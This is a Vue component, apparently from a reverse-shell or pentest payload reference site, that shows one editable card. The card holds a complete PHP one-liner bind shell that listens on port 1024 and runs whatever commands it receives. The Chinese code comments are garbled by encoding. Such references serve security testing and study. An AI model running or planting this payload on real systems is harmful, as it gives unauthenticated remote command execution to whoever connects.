<template>
    <div class="reverse">
        <el-card class="mainContent" :style="{ backgroundColor: isDark ? '#303030' : '#ecefff' }" shadow="always" @click="focusEditable">
            <div class="content">
                <span>ğŸš€</span>
                <span ref="editable" contenteditable class="editable">php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",1024);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'</span>
            </div>
        </el-card>
    </div>
</template>

<script setup lang='js'>
import { ref } from 'vue'
import { useDark } from '@vueuse/core'
const isDark = useDark()

const editable = ref(null)

function focusEditable() {
    if (editable.value) {
        editable.value.focus()
    }
}
</script>

<style lang="scss" scoped>
.reverse {
    padding: 10px 0 0 20px;

    .mainContent {
        /* å…¶ä»–æ ·å¼ */
        cursor: text; /* é¼ æ ‡æŒ‡é’ˆå˜ä¸ºæ–‡æœ¬é€‰æ‹© */
    }

    .content {
        display: flex;
        align-items: flex-start; /* ç¡®ä¿æ–‡æœ¬åœ¨é¡¶éƒ¨å¯¹é½ */
    }

    .editable {
        outline: none; /* ç§»é™¤ç¼–è¾‘æ—¶çš„è¾¹æ¡† */
        flex: 1; /* ä½¿æ–‡æœ¬åŒºåŸŸå æ®å‰©ä½™ç©ºé—´ */
        word-break: break-word; /* ç¡®ä¿é•¿å•è¯æ¢è¡Œ */
        white-space: pre-wrap; /* ä¿ç•™ç©ºç™½ç¬¦å¹¶æ¢è¡Œ */
    }
}
</style>